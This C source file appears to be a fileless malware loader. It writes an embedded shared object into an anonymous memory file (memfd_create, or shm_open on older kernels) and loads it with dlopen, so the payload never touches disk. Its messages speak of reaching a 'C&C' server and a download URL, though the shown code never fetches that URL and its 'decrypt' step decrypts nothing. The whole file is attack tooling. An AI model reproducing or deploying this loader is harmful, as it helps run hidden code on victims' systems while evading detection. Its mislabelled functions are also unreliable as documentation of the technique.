#include <dlfcn.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/utsname.h>
#include <unistd.h>

#include "sharedbin.h"

#define SHM_NAME "memfd_file"

int kernel_version()
{
	struct utsname buffer;
	uname(&buffer);
	
	char *token;
	char separator[] = ".";
	
	token = strtok(buffer.release, separator);
	if (atoi(token) < 3)
		return 0;
	else if (atoi(token) > 3)
		return 1;

	token = strtok(NULL, separator);
	if (atoi(token) < 17)
		return 0;
	else
		return 1;
}


// Returns a file descriptor where we can write our shared object
int open_ramfs(void)
{
	int shm_fd;

	if (kernel_version() == 0)
    {
		shm_fd = shm_open(SHM_NAME, O_RDWR | O_CREAT, S_IRWXU);
		if (shm_fd < 0)
        {
			fprintf(stderr, "[-] Could not open file descriptor\n");
			exit(-1);
		}
	}
	else 
    {
		shm_fd = memfd_create(SHM_NAME, 1);
		if (shm_fd < 0)
        {
			fprintf(stderr, "[- Could not open file descriptor\n");
			exit(-1);
		}
	}
	return shm_fd;
}

size_t write_data (void *ptr, size_t size, size_t nmemb, int shm_fd) {
    int bytes = write(shm_fd, ptr, nmemb);
	if (bytes < 0) {
		fprintf(stderr, "[-] Could not write file :'(\n");
		close(shm_fd);
		exit(-1);
	}
	printf("[+] File written!\n");
    
    return bytes;
}

int decrypt_in_RAM(char *download)
{
	int shm_fd;

	shm_fd = open_ramfs();
	printf("[+] File Descriptor Shared Memory created!\n");
    
    write(shm_fd, shared_so, shared_so_len);
	
	return shm_fd;
}

// Load the shared object
void load_so(int shm_fd) {
	char path[1024];
	void *handle;

	printf("[+] Trying to load Shared Object!\n");
	if (kernel_version() == 1) { //Funky way
		snprintf(path, 1024, "/proc/%d/fd/%d", getpid(), shm_fd);
	} else { // Not funky way :(
		close(shm_fd);
		snprintf(path, 1024, "/dev/shm/%s", SHM_NAME);
	}
	
	printf("Loading from [%s]\n", path);
	handle = dlopen(path, RTLD_LAZY);
	if (!handle) {
		fprintf(stderr,"[-] Dlopen failed with error: %s\n", dlerror());
	}
}

int main (int argc, char **argv) {
	char url[] = "http://localhost:8000/shared.so";
	int fd;

	printf("[+] Trying to reach C&C & start download...\n");
	fd = decrypt_in_RAM(url);
	load_so(fd);
	exit(0);
}
